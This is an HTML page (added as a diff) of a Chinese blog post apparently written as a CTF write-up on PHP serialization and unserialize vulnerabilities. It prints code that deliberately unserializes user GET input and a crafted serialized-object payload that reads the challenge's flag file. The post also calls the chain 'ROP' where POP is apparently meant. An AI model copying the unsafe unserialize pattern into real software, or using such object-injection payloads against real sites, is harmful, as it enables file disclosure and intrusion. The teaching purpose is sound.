@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Luc1fer">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="序列化与反序列化">
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>序列化与反序列化 - Luc1fer&#39;blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories/">
+                    Categories
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2019/03/23/序列化与反序列化/">
+                序列化与反序列化
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-03-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>老生长谈了，可是我还是不会</p>
+<a id="more"></a>
+
+<h2 id="0x01为什么要序列化"><a href="#0x01为什么要序列化" class="headerlink" title="0x01为什么要序列化"></a>0x01为什么要序列化</h2><p>php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的：</p>
+<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kawe13ecj305w03nt8i.jpg" alt></p>
+<p>其中index.php代码如下：</p>
+<pre><code>&lt;?php 
+@highlight_file(__FILE__);
+require_once(&apos;shield.php&apos;);
+$x = new Shield();
+isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];
+if (!empty($g)) {
+    $x = unserialize($g);
+}
+echo $x-&gt;readfile();
+?&gt;</code></pre><p>可以看出来$x就是跨脚本传输的变量。</p>
+<p>如果在一个脚本调用跨脚本传输的变量之前，前一个包含该变量的脚本已经执行结束所有的变量和内容都已经释放掉了，这时，我们不能让前一个脚本不断循环执行等待后面的脚本去调用。serialize和unserialize 就是解决这一问题的。serialize将变量转换为字符串并且在转换过程中保存当前变量的值;unserialize则将serialize生成的字符串变回成变量。</p>
+<p>看一个例子，简单的分析一下：</p>
+<pre><code>&lt;?php
+class Test
+{
+public $age = 0;
+public $name = &apos;brain&apos;;
+
+public function PrintInfo()
+{
+    echo &apos;[+]User: &apos;.$this-&gt;name .&apos;: is&apos; . $this-&gt;age .&apos;years old.&apos;;
+}
+}
+$user =  new Test();
+$user-&gt;age = 20;
+$user-&gt;name = &apos;Jack&apos;;
+$user-&gt;PrintInfo();
+echo serialize($user);
+
+?&gt;</code></pre><p>输出结果如下</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kawi4ovpj30p204wdg5.jpg" alt></p>
+<p>使用unserialize则会使这串<strong>字符串</strong>恢复成<strong>类对象</strong>。</p>
+<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>一共有几个魔法函数需要注意，这是例子：</p>
+<pre><code>&lt;?php
+class Test
+{
+public $variable = &quot;BRAIN&quot;;
+public $variable1 = &quot;BRAVO&quot;;
+public function PrintVariable()
+{
+    echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;
+}
+public function __construct()
+{
+    echo &apos;__construct&apos;.&apos;&lt;br&gt;&apos;;
+}
+public function __destruct()
+{
+    echo &apos;__destruct&lt;br /&gt;&apos;;
+}
+public function __wakeup()
+{
+    echo &apos;__wakeup&lt;br /&gt;&apos;;
+}
+public function __sleep()
+{
+    echo &apos;__sleep&lt;br /&gt;&apos;;
+    return array(&apos;variable&apos; , &apos;variable1&apos;);
+}
+}    
+$obj = new Test();  //创建对象时调用__construct
+
+$serialized = serialize($obj); //序列化对象时调用__sleep
+
+print(&apos;Serialized: &apos;.$serialized . &apos;&lt;br /&gt;&apos;);
+
+$obj2 = unserialize($serialized); //重建对象调用 __wakeup
+
+$obj2-&gt;PrintVariable(); //调用方法输出数据
+//脚本结束调用__destruct
+?&gt;</code></pre><p>这是执行结果：</p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kawmc729j30h504a746.jpg" alt></p>
+<p>可以看到各个函数的执行顺序。</p>
+<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>反序列化的危害就在于反序列化后的字符串参数被用户可控，从而在序列化之后造成不可预料的问题。</p>
+<p>拿一道ctf题举例，文件结构就是文章开头提到的结构</p>
+<pre><code>    idnex.php
+
+&lt;?php 
+@highlight_file(__FILE__);
+require_once(&apos;shield.php&apos;);
+$x = new Shield();
+isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];
+if (!empty($g)) {
+    $x = unserialize($g);
+}
+echo $x-&gt;readfile();
+?&gt;
+
+
+shield.php
+
+&lt;?php
+//flag is in pctf.php
+class Shield {
+    public $file;
+    function __construct($filename = &apos;&apos;) {
+        $this -&gt; file = $filename;
+    }
+    function readfile() {
+        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  
+        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
+            return @file_get_contents($this-&gt;file);
+        }
+    }
+}
+?&gt;</code></pre><p>我们可以看到index.php中先包含了shield.php，然后创建了一个新对象，在判断完get的变量之后进行反序列化，随后调用readfile()函数。<br>在shield.php中提示flag在pctf.php中，随后在readfile()函数中对$file进行一定过滤之后读文件内容。</p>
+<p>我们的想法就是控制$file的值为pctf.php</p>
+<pre><code>&lt;?php
+//flag is in pctf.php
+class Shield {
+    public $file;
+    function __construct($filename = &apos;&apos;) {
+        $this -&gt; file = $filename;
+    }
+    function readfile() {
+        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  
+        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
+            return @file_get_contents($this-&gt;file);
+        }
+    }
+}
+$a = new Shield(&quot;pctf.php&quot;);
+echo serialize($a);
+?&gt;
+序列化结果
+O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>然后我们就可以尝试传入这个字符串</p>
+<pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>就可以在源码中看到flag.</p>
+<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kawpcjn0j30br08twep.jpg" alt></p>
+<h2 id="ROP-Return-Oriented-programming-链"><a href="#ROP-Return-Oriented-programming-链" class="headerlink" title="ROP(Return-Oriented programming)链"></a>ROP(Return-Oriented programming)链</h2><p>这道题的攻击链比较简单。当我们传入序列化完成的字符串后，程序先对其反序列化生成一个对象，这时没有_wakeup()，_destruct()魔法函数，只是简单的反序列化，之后调用readfile()函数进行$file的内容的读取，而我们将$file的值设置为了pctf.php，于是我们得到了该文件的内容。<br>反序列化漏洞需要两个条件：</p>
+<blockquote>
+<p>1.存在序列化字符串的可控制点或者说是输入点</p>
+<p>2.存在可以利用的魔法函数</p>
+</blockquote>
+<p>这道题目对魔法函数的利用好像不是很明显.(ε=ε=ε=┏(゜ロ゜;)┛)</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/serialize/">#serialize</a> <a href="/tags/php/">#php</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/31/JavaScript原型污染/">JavaScript Prototype 污染攻击</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/30/SSTI/">SSTI-服务器端模板注入</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/22/HostSplit/">HostSplit-Exploitable</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/比赛回顾/">比赛回顾</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/docker/">docker</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/wp/">wp</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/渗透测试/">渗透测试</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/BrainLyh">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:brainsemail@163.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
